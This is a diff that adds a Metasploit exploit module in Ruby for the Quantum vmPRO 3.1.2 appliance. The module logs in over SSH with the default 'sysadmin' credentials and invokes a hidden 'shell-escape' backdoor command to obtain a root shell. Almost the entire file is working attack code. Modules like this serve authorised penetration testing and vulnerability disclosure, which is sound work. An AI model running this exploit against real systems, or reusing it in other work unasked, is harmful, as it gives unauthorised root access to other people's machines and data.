@@ -1,0 +1,136 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+require 'net/ssh'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Auxiliary::CommandShell
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "Quantum vmPRO Backdoor Command",
+      'Description'    => %q{
+        This module abuses a backdoor command in vmPRO 3.1.2. Any user, even without admin
+        privileges, can get access to the restricted SSH shell. By using the hidden backdoor
+        "shell-escape" command it's possible to drop to a real root bash shell.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'xistence <xistence[at]0x90.nl>'  # Original discovery and Metasploit module
+        ],
+      'References'     =>
+        [
+          ['URL', 'http://packetstormsecurity.com/files/125760/quantumvmpro-backdoor.txt']
+        ],
+      'DefaultOptions'  =>
+        {
+          'ExitFunction' => "none"
+        },
+      'Payload'        =>
+        {
+          'Compat' => {
+            'PayloadType'    => 'cmd_interact',
+            'ConnectionType' => 'find'
+          }
+        },
+      'Platform'       => 'unix',
+      'Arch'           => ARCH_CMD,
+      'Targets'        =>
+        [
+          ['Quantum vmPRO 3.1.2', {}],
+        ],
+      'Privileged'     => true,
+      'DisclosureDate' => "Mar 17 2014",
+      'DefaultTarget'  => 0))
+
+    register_options(
+      [
+        Opt::RHOST(),
+        Opt::RPORT(22),
+        OptString.new('USER', [ true, 'vmPRO SSH user', 'sysadmin']),
+        OptString.new('PASS', [ true, 'vmPRO SSH password', 'sysadmin'])
+      ], self.class
+    )
+
+    register_advanced_options(
+      [
+        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),
+        OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])
+      ]
+    )
+  end
+
+
+  def rhost
+    datastore['RHOST']
+  end
+
+
+  def rport
+    datastore['RPORT']
+  end
+
+
+  def do_login(user, pass)
+    opts = {
+      :auth_methods => ['password', 'keyboard-interactive'],
+      :msframework  => framework,
+      :msfmodule    => self,
+      :port         => rport,
+      :disable_agent => true,
+      :config => true,
+      :password => pass,
+      :record_auth_info => true,
+      :proxies => datastore['Proxies']
+    }
+
+    opts.merge!(:verbose => :debug) if datastore['SSH_DEBUG']
+
+    begin
+      ssh = nil
+      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
+        ssh = Net::SSH.start(rhost, user, opts)
+      end
+    rescue Rex::ConnectionError, Rex::AddressInUse
+      return nil
+    rescue Net::SSH::Disconnect, ::EOFError
+      print_error "#{rhost}:#{rport} SSH - Disconnected during negotiation"
+      return nil
+    rescue ::Timeout::Error
+      print_error "#{rhost}:#{rport} SSH - Timed out during negotiation"
+      return nil
+    rescue Net::SSH::AuthenticationFailed
+      print_error "#{rhost}:#{rport} SSH - Failed authentication"
+      return nil
+    rescue Net::SSH::Exception => e
+      print_error "#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}"
+      return nil
+    end
+
+    if ssh
+      conn = Net::SSH::CommandStream.new(ssh, 'shell-escape', true)
+      return conn
+    end
+
+    return nil
+  end
+
+
+  def exploit
+    user = datastore['USER']
+    pass = datastore['PASS']
+
+    print_status("#{rhost}:#{rport} - Attempt to login...")
+    conn = do_login(user, pass)
+    if conn
+      print_good("#{rhost}:#{rport} - Login Successful with '#{user}:#{pass}'")
+      handler(conn.lsock)
+    end
+  end
+end
